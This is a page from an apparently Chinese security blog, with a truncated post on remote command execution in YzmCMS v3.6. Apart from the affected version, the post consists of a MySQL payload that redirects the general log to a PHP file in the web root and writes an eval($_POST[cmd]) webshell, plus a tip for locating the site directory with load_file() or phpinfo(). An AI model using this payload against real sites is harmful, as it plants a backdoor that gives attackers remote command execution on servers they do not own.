+    <article id="post-YzmCMS/YzmCMS v3.6 远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/YzmCMS/YzmCMS%20v3.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:26:08.748Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="YzmCMS-v3-6-远程命令执行"><a href="#YzmCMS-v3-6-远程命令执行" class="headerlink" title="YzmCMS v3.6 远程命令执行"></a>YzmCMS v3.6 远程命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>YzmCMS v3.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>Payload：</p>
+<pre><code>show variables like &#39;%general%&#39;;   #查看配置
+set global general_log = on;        #开启general log模式
+set global general_log_file =CONCAT(&quot;E:\\study\\WWW\\YzmCMS\\test.&quot;,&quot;php&quot;); 
+select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;   #写入shell
+</code></pre>
+<h5 id="1、执行sql语句，查看mysql日志配置情况"><a href="#1、执行sql语句，查看mysql日志配置情况" class="headerlink" title="1、执行sql语句，查看mysql日志配置情况"></a>1、执行sql语句，查看mysql日志配置情况</h5><p><img src="/resource/YzmCMSv3.6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png"></p>
+<h4 id="2、根据日志文件位置或者默认站点路径来推测站点目录，可用load-file-函数来测试，确认站点目录位置。或者通过phpinfo-等信息收集获取站点目录。"><a href="#2、根据日志文件位置或者默认站点路径来推测站点目录，可用load-file-函数来测试，确认站点目录位置。或者通过phpinfo-等信息收集获取站点目录。" class="headerlink" title="2、根据日志文件位置或者默认站点路径来推测站点目录，可用load_file()函数来测试，确认站点目录位置。或者通过phpinfo()等信息收集获取站点目录。"></a>2、根据日志文件位置或者默认站点路径来推测站点目录，可用load_file()函数来测试，确认站点目录位置。或者通过phpinfo()等信息收集获取站点目录。</h4>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/YzmCMS/YzmCMS%20v3.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/YzmCMS/YzmCMS%20v3.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qz8s00nry8v168i1alki" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/15/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="page-number" href="/page/15/">15</a><span class="page-number current">16</span><a class="page-number" href="/page/17/">17</a><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/17/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
